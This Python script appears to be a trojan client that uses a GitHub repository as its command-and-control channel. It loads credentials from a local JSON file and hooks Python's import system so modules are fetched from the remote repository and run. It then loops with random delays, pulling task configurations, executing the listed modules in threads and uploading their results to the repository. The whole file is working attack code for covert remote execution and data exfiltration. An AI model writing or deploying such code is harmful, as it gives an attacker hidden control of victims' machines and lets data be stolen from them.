# -*- coding: utf-8 -*-

import json
import sys
import time
import random
import threading
import queue
import argparse
from pelo_utils.plaintext_module_importer import ModuleImporter
from pelo_utils.git_connecter import GitConnecter

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--path", type = str, default = "C:/pelo/github_info.json")
args = parser.parse_args()
path = args.path

json_flie = open(path)
json_obj = json.load(json_flie)

username = json_obj["user"]
password = json_obj["pass"]
repository = json_obj["repo"]

trajon_id = "abc"

trajon_config = "%s.json" % trajon_id
data_path = "data/%s/" % trajon_id
trajon_modules = []
configured = False
task_queue = queue.Queue()

git_connecter = GitConnecter(username, password, repository)
sys.meta_path.insert(0, ModuleImporter(git_connecter.get_file_contents))

def module_runnner(modulename):
    task_queue.put(1)
    result = sys.modules[modulename].run()
    task_queue.get()
    git_connecter.store_module_result(result.encode())

while True:
    if task_queue.empty():
        config = git_connecter.get_trajon_config()
        for task in config:
            t = threading.Thread(target=module_runnner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))